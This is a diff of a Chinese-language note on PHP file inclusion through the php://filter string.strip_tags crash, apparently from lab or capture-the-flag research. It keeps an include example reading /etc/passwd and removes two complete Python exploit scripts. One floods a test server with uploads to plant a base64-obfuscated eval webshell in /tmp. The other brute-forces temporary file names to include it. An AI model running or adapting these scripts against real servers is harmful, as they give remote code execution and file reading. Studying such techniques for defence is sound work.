@@ -30,8 +30,8 @@ file(urldecode('php://filter/convert.quoted-printable-encode/resource=data://,%b
 
 ### trip_tags
 
-同上，但是此时测试在版本PHP7.0.33成功复现
-```
+同上，但是在版本PHP7.0.33成功复现且7.0.33
+```php
 <?php
 include("php://filter/string.strip_tags/resource=/etc/passwd");
 ?>
@@ -39,90 +39,3 @@ include("php://filter/string.strip_tags/resource=/etc/passwd");
 ```
 
 
-作者写的利用脚本
-```py
-#!/usr/bin/env python
-# -*- coding: utf-8 -*-
-
-import requests
-import string
-import itertools
-
-charset = string.digits + string.letters
-
-host = "192.168.43.155"
-port = 80
-base_url = "http://%s:%d" % (host, port)
-
-
-def upload_file_to_include(url, file_content):
-    files = {'file': ('evil.jpg', file_content, 'image/jpeg')}
-    try:
-        response = requests.post(url, files=files)
-    except Exception as e:
-        print e
-
-
-def generate_tmp_files():
-    webshell_content = '<?php eval($_REQUEST[c]);?>'.encode(
-        "base64").strip().encode("base64").strip().encode("base64").strip()
-    file_content = '<?php if(file_put_contents("/tmp/ssh_session_HD89q2", base64_decode("%s"))){echo "flag";}?>' % (
-        webshell_content)
-    phpinfo_url = "%s/include.php?f=php://filter/string.strip_tags/resource=/etc/passwd" % (
-        base_url)
-    length = 6
-    times = len(charset) ** (length / 2)
-    for i in xrange(times):
-        print "[+] %d / %d" % (i, times)
-        upload_file_to_include(phpinfo_url, file_content)
-
-
-def main():
-    generate_tmp_files()
-
-
-if __name__ == "__main__":
-    main()
-```
-```
-#!/usr/bin/env python
-# -*- coding: utf-8 -*-
-
-import requests
-import string
-
-charset = string.digits + string.letters
-
-host = "192.168.43.155"
-port = 80
-base_url = "http://%s:%d" % (host, port)
-
-
-def brute_force_tmp_files():
-    for i in charset:
-        for j in charset:
-            for k in charset:
-                for l in charset:
-                    for m in charset:
-                        for n in charset:
-                            filename = i + j + k + l + m + n
-                            url = "%s/include.php?f=/tmp/php%s" % (
-                                base_url, filename)
-                            print url
-                            try:
-                                response = requests.get(url)
-                                if 'flag' in response.content:
-                                    print "[+] Include success!"
-                                    return True
-                            except Exception as e:
-                                print e
-    return False
-
-
-def main():
-    brute_force_tmp_files()
-
-
-if __name__ == "__main__":
-    main()
-```
